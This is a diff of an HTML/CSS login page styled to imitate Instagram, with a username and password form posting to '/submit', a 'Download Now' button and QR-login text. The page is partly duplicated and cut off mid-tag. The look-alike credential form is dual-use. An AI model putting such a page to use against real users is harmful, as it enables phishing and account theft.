@@ -12,17 +12,19 @@
             box-sizing: border-box;
         }
 
+        /* Body styling */
         body {
             font-family: Arial, sans-serif;
-            background-color: black;  /* Changed background to black */
-            color: white;  /* Text color set to white */
+            background-color: black; /* Black background */
+            color: white; /* White text */
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            flex-direction: column;
         }
 
-        /* Main container */
+        /* Login container */
         .login-container {
             width: 350px;
             padding: 30px;
@@ -32,7 +34,7 @@
             text-align: center;
         }
 
-        /* Instagram logo */
+        /* Logo */
         .logo img {
             width: 150px;
             margin-bottom: 20px;
@@ -48,11 +50,11 @@
             font-size: 14px;
         }
 
-        /* Button style */
+        /* Button */
         button {
             width: 100%;
             padding: 10px;
-            background-color: #0095f6;  /* Instagram blue */
+            background-color: #0095f6; /* Instagram blue */
             color: white;
             border: none;
             border-radius: 5px;
@@ -60,32 +62,29 @@
             cursor: pointer;
         }
 
-        /* Hover effect for the login button */
         button:hover {
-            background-color: green;  /* Change background to green on hover */
+            background-color: green; /* Hover effect */
         }
 
-        /* Forgot Password Box */
+        /* Forgot password link */
         .forgot-password-box {
-            margin-top: 10px;  /* Space above the box */
+            margin-top: 10px;
             padding: 10px;
-            background-color: #f1f1f1;  /* Grey box background */
+            background-color: #f1f1f1;
             border-radius: 5px;
-            border: 1px solid #dbdbdb;  /* Light border */
+            border: 1px solid #dbdbdb;
             text-align: center;
         }
 
-        /* Style for the "Forgot password?" text */
         .forgot-password {
-            color: grey;  /* Default grey color */
+            color: grey;
             font-size: 14px;
             text-decoration: none;
         }
 
-        /* Hover effect for the "Forgot password?" text */
         .forgot-password:hover {
-            color: red;  /* Red color on hover */
-            text-decoration: underline;  /* Underline on hover */
+            color: red;
+            text-decoration: underline;
         }
 
         /* Footer link styles */
@@ -95,260 +94,81 @@
 
         .footer a {
             font-size: 12px;
-            color: #8e8e8e;  /* Default link color */
+            color: #8e8e8e;
             text-decoration: none;
         }
 
-        /* Red hover effect for the link */
         .footer a:hover {
-            color: red;  /* Change text color to red when hovered */
+            color: red;
             text-decoration: underline;
         }
 
-        /* Affiliate link styles */
-        .affiliate-box {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #f1f1f1;
-            border-radius: 5px;
-            border: 1px solid #dbdbdb;
-            text-align: center;
-        }
-
-        .affiliate-link {
-            font-size: 14px;
-        }
-
-        .need-account {
-            color: grey;
-        }
-
-        .register {
-            color: blue;
+        /* Download button */
+        .download-btn {
+            padding: 8px 20px;
+            background-color: #0095f6; /* Blue background */
+            color: black;
             text-decoration: none;
-        }
-
-        /* Hover effect for the "Register" link */
-        .register:hover {
-            color: green;  /* Green color when hovered */
-        }
-
-        /* Optional: Add a little margin for smaller devices */
-        @media (max-width: 400px) {
-            .login-container {
-                width: 90%;
-            }
-        }
-    </style>
-</head>
-<body>
-
-    <!-- Login Container -->
-    <div class="login-container">
-        <!-- Instagram logo -->
-        <div class="logo">
-            <!-- You can add the Instagram logo here -->
-        </div>
-
-        <!-- Login Form -->
-        <form action="/submit" method="post">
-            <input type="text" name="username" placeholder="Phone, email, or username" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Log in</button>
-        </form>
-
-        <!-- Forgot Password Box -->
-        <div class="forgot-password-box">
-            <a href="password-reset.html" class="forgot-password">Forgot password?</a>
-        </div>
-
-        <!-- Affiliate Box with Register link -->
-        <div class="affiliate-box">
-            <div class="affiliate-link">
-                <span class="need-account">Need an account? </span>
-                <a href="https://www.example.com/register" class="register">Register</a>
-            </div>
-        </div>
-    </div>
-
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Instagram</title>
-    <style>
-        /* Basic reset */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: Arial, sans-serif;
-            background-color: black;  /* Changed background to black */
-            color: white;  /* Text color set to white */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        /* Main container */
-        .login-container {
-            width: 350px;
-            padding: 30px;
-            background-color: white;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-            border-radius: 5px;
-            text-align: center;
-        }
-
-        /* Instagram logo */
-        .logo img {
-            width: 150px;
-            margin-bottom: 20px;
-        }
-
-        /* Input fields */
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 5px;
-            font-size: 14px;
-        }
-
-        /* Button style */
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #0095f6;  /* Instagram blue */
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 14px;
-            cursor: pointer;
-        }
-
-        /* Hover effect for the login button */
-        button:hover {
-            background-color: green;  /* Change background to green on hover */
-        }
-
-        /* Forgot Password Box */
-        .forgot-password-box {
-            margin-top: 10px;  /* Space above the box */
-            padding: 10px;
-            background-color: #f1f1f1;  /* Grey box background */
-            border-radius: 5px;
-            border: 1px solid #dbdbdb;  /* Light border */
-            text-align: center;
-        }
-
-        /* Style for the "Forgot password?" text */
-        .forgot-password {
-            color: grey;  /* Default grey color */
-            font-size: 14px;
-            text-decoration: none;
-        }
-
-        /* Hover effect for the "Forgot password?" text */
-        .forgot-password:hover {
-            color: red;  /* Red color on hover */
-            text-decoration: underline;  /* Underline on hover */
-        }
-
-        /* Footer link styles */
-        .footer {
-            margin-top: 20px;
-        }
-
-        .footer a {
+            border-radius: 50px;
             font-size: 12px;
-            color: #8e8e8e;  /* Default link color */
-            text-decoration: none;
-        }
-
-        /* Red hover effect for the link */
-        .footer a:hover {
-            color: red;  /* Change text color to red when hovered */
-            text-decoration: underline;
-        }
-
-        /* Affiliate link styles */
-        .affiliate-box {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #f1f1f1;
-            border-radius: 5px;
-            border: 1px solid #dbdbdb;
             text-align: center;
+            margin-right: 20px;
         }
 
-        .affiliate-link {
-            font-size: 14px;
+        .download-btn:hover {
+            background-color: green;
+            color: white;
         }
 
-        .need-account {
-            color: grey;
+        /* QR Code content */
+        .qr-content {
+            position: absolute;
+            left: 5%;
+            top: 80%;
+            transform: translateY(-50%);
+            text-align: left;
+            padding-left: 20px;
         }
 
-        .register {
-            color: blue;
+        .login-with-qr {
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
             text-decoration: none;
+            margin-bottom: 10px;
         }
 
-        /* Hover effect for the "Register" link */
-        .register:hover {
-            color: green;  /* Green color when hovered */
+        .login-description {
+            font-size: 14px;
+            color: white;
         }
 
-        /* Optional: Add a little margin for smaller devices */
-        @media (max-width: 400px) {
-            .login-container {
-                width: 90%;
-            }
+        /* Borders */
+        .top-border, .bottom-border {
+            position: fixed;
+            width: 100%;
+            background-color: black;
+            border-top: 5px solid grey;
+            padding: 10px 0;
+            text-align: right;
+        }
+
+        .bottom-border {
+            bottom: 0;
+            text-align: center;
         }
     </style>
 </head>
 <body>
 
-    <!-- Login Container -->
-    <div class="login-container">
-        <!-- Instagram logo -->
-        <div class="logo">
-            <!-- You can add the Instagram logo here -->
-        </div>
-
-        <!-- Login Form -->
-        <form action="/submit" method="post">
-            <input type="text" name="username" placeholder="Phone, email, or username" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Log in</button>
-        </form>
-
-        <!-- Forgot Password Box -->
-        <div class="forgot-password-box">
-            <a href="password-reset.html" class="forgot-password">Forgot password?</a>
-        </div>
-
-        <!-- Affiliate Box with Register link -->
-        <div class="affiliate-box">
-            <div class="affiliate-link">
-                <span class="need-account">Need an account? </span>
-                <a href="https://www.example.com/register" class="register">Register</a>
-            </div>
-        </div>
+    <!-- Top Border with Download Button -->
+    <div class="top-border">
+        <a href="https://www.example.com/download" class="download-btn">Download Now</a>
     </div>
 
-</body>
-</html>
-
-
-
-  
+    <!-- Login Container -->
+    <div class="login-container">
+        <div class="logo">
+            <!-- Instagram logo here -->
+        </div>
+        <form action=
